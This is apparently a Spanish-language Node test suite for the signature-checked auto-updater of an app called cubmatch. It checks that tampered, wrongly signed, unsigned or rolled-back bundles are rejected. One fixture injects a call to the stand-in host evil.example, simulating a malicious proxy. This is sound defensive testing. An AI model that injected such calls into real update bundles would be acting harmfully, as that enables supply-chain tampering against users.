// Auto-actualización FIRMADA: boot.js solo ejecuta código descargado si la
// firma ECDSA P-256 verifica con la clave pública incrustada. Sin jsdom:
// boot.js corre en un contexto vm con fetch simulado y WebCrypto real.
import test from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import { readFileSync } from 'node:fs';
import { webcrypto } from 'node:crypto';
import {
  generarParDeClaves, firmarLive, verificarLive, publicJwkDePem, mensajeFirmado,
} from '../tools/firma.mjs';

const ROOT = new URL('..', import.meta.url);
const BOOT_SRC = readFileSync(new URL('src/boot.js', ROOT), 'utf8');
const BUNDLED = '1.0.0';

const claves = generarParDeClaves();
const atacante = generarParDeClaves();

// Bundle "vivo" de mentira, válido para validLiveText (>50 KB, __cubmatchApp).
function liveJs(version) {
  return 'window.__cubmatchApp={version:"' + version + '",boot:function(){window.__liveBoot&&window.__liveBoot()},'
    + 'dispose:function(){}};/*__cubmatchApp ' + 'x'.repeat(60000) + '*/';
}

// Ejecuta boot.js y espera a que termine el chequeo de actualización.
async function correrBoot({ pub, web }) {
  const pubStr = pub ? JSON.stringify(pub) : '';
  const src = BOOT_SRC.replace('__BUNDLED_VERSION__', BUNDLED).replace('__UPDATE_PUBKEY__', () => pubStr);
  assert.ok(!src.includes('__UPDATE_PUBKEY__') && !src.includes('__BUNDLED_VERSION__'));
  const est = { fetches: [], ejecutados: 0, liveBoots: 0, fallbackBoots: 0 };
  const sandbox = {
    console, setTimeout, clearTimeout, Date, AbortController, TextEncoder, TextDecoder, atob,
    crypto: webcrypto,
    fetch: async (url) => {
      est.fetches.push(url);
      const r = web(url);
      if (!r) return { ok: false, status: 404 };
      const bytes = Buffer.from(r, 'utf8');
      return {
        ok: true,
        text: async () => r,
        arrayBuffer: async () => bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength),
      };
    },
    __liveBoot: () => { est.liveBoots++; },
  };
  sandbox.window = sandbox;
  sandbox.__cubmatchApp = { version: BUNDLED, boot() { est.fallbackBoots++; }, dispose() {} };
  const ctx = vm.createContext(sandbox);
  sandbox.document = {
    readyState: 'complete',
    head: {
      appendChild(s) { s.parentNode = this; est.ejecutados++; vm.runInContext(s.textContent, ctx); },
      removeChild() {},
    },
    createElement: () => ({ textContent: '', parentNode: null }),
    getElementById: (id) => (id === 'pantalla-inicio' ? { hidden: false } : null),
    addEventListener() {},
  };
  vm.runInContext(src, ctx);
  const fin = /takeover|sin actualización|al día|desactivada|no tomó el control/;
  for (let i = 0; i < 300; i++) {
    const log = sandbox.__cubmatchUpdateLog || [];
    if (log.some((l) => fin.test(l))) break;
    await new Promise((r) => setTimeout(r, 10));
  }
  est.log = (sandbox.__cubmatchUpdateLog || []).join('\n');
  return est;
}

// Servidor simulado: sirve version.js, el bundle y la firma.
function servidor({ version = '1.0.1', js, meta, vJs }) {
  return (url) => {
    if (url.includes('version.js')) return 'window.__CUBMATCH_REMOTE_VERSION="' + (vJs || version) + '";\n';
    if (url.includes('cubmatch-live.sig.json')) return meta === null ? null : JSON.stringify(meta);
    if (url.includes('cubmatch-live.js')) return js;
    return null;
  };
}

test('firma.mjs: firma válida verifica; alterar el código, la versión o la clave la rompe', () => {
  const js = liveJs('1.0.1');
  const { privatePem, publicJwk } = claves;
  const meta = firmarLive('1.0.1', js, privatePem);
  assert.equal(verificarLive(meta, js, publicJwk), true);
  assert.equal(verificarLive(meta, js + ' ', publicJwk), false, 'código alterado');
  assert.equal(verificarLive({ ...meta, v: '9.9.9' }, js, publicJwk), false, 'firma reutilizada con otra versión');
  assert.equal(verificarLive(meta, js, atacante.publicJwk), false, 'otra clave');
  assert.equal(verificarLive(null, js, publicJwk), false);
  assert.equal(verificarLive({ v: '1.0.1', sig: '!!!' }, js, publicJwk), false);
  assert.equal(publicJwkDePem(privatePem).x, publicJwk.x);
  assert.equal(mensajeFirmado('1.2.3', Buffer.from('ab')).toString(), '1.2.3\nab');
});

test('boot: firma válida → ejecuta el bundle y toma el control', async () => {
  const js = liveJs('1.0.1');
  const meta = firmarLive('1.0.1', js, claves.privatePem);
  const e = await correrBoot({ pub: claves.publicJwk, web: servidor({ js, meta }) });
  assert.equal(e.fallbackBoots, 1);
  assert.equal(e.ejecutados, 1, e.log);
  assert.equal(e.liveBoots, 1, e.log);
  assert.match(e.log, /takeover a 1\.0\.1/);
});

test('boot: bundle alterado por un proxy → NO se ejecuta', async () => {
  const js = liveJs('1.0.1');
  const meta = firmarLive('1.0.1', js, claves.privatePem);
  const malo = js.replace('boot:function(){', 'boot:function(){fetch("https://evil.example/x");');
  const e = await correrBoot({ pub: claves.publicJwk, web: servidor({ js: malo, meta }) });
  assert.equal(e.ejecutados, 0, e.log);
  assert.equal(e.liveBoots, 0);
  assert.match(e.log, /firma inválida/);
  assert.match(e.log, /sin actualización/);
});

test('boot: bundle firmado con OTRA clave → rechazado', async () => {
  const js = liveJs('1.0.1');
  const meta = firmarLive('1.0.1', js, atacante.privatePem);
  const e = await correrBoot({ pub: claves.publicJwk, web: servidor({ js, meta }) });
  assert.equal(e.ejecutados, 0, e.log);
});

test('boot: sin clave pública incrustada → no descarga ni ejecuta nada', async () => {
  const js = liveJs('1.0.1');
  const meta = firmarLive('1.0.1', js, claves.privatePem);
  const e = await correrBoot({ pub: null, web: servidor({ js, meta }) });
  assert.equal(e.fetches.length, 0);
  assert.equal(e.ejecutados, 0);
  assert.equal(e.fallbackBoots, 1, 'la app incluida arranca igual');
  assert.match(e.log, /desactivada/);
});

test('boot: sin archivo de firma (404) → rechazado', async () => {
  const js = liveJs('1.0.1');
  const e = await correrBoot({ pub: claves.publicJwk, web: servidor({ js, meta: null }) });
  assert.equal(e.ejecutados, 0, e.log);
});

test('boot: firma válida pero de una versión NO más nueva → rechazado (anti-rollback)', async () => {
  const js = liveJs('0.9.0');
  const meta = firmarLive('0.9.0', js, claves.privatePem);
  // version.js anuncia 1.0.1 para provocar la descarga; la firma dice 0.9.0.
  const e = await correrBoot({ pub: claves.publicJwk, web: servidor({ js, meta, vJs: '1.0.1' }) });
  assert.equal(e.ejecutados, 0, e.log);
  assert.match(e.log, /no es más nueva/);
});

test('boot: firma reutilizada declarando otra versión → rechazado', async () => {
  const js = liveJs('1.0.1');
  const meta = firmarLive('1.0.1', js, claves.privatePem);
  const e = await correrBoot({ pub: claves.publicJwk, web: servidor({ js, meta: { ...meta, v: '9.9.9' } }) });
  assert.equal(e.ejecutados, 0, e.log);
});

test('boot: un proxy malicioso no impide que otro, legítimo, entregue la actualización', async () => {
  const js = liveJs('1.0.1');
  const meta = firmarLive('1.0.1', js, claves.privatePem);
  const bueno = servidor({ js, meta });
  const malo = js.replace('dispose:function(){}', 'dispose:function(){},robo:1');
  const web = (url) => (url.startsWith('https://gh-proxy.com/') && url.includes('cubmatch-live.js') ? malo : bueno(url));
  const e = await correrBoot({ pub: claves.publicJwk, web });
  assert.equal(e.ejecutados, 1, e.log);
  assert.equal(e.liveBoots, 1);
  assert.match(e.log, /firma inválida/);
  assert.match(e.log, /takeover a 1\.0\.1/);
});

test('boot: al día (mismo número de versión) → no descarga el bundle', async () => {
  const js = liveJs('1.0.0');
  const meta = firmarLive('1.0.0', js, claves.privatePem);
  const e = await correrBoot({ pub: claves.publicJwk, web: servidor({ version: '1.0.0', js, meta }) });
  assert.equal(e.ejecutados, 0);
  assert.ok(!e.fetches.some((u) => u.includes('cubmatch-live.js')));
  assert.match(e.log, /al día/);
});
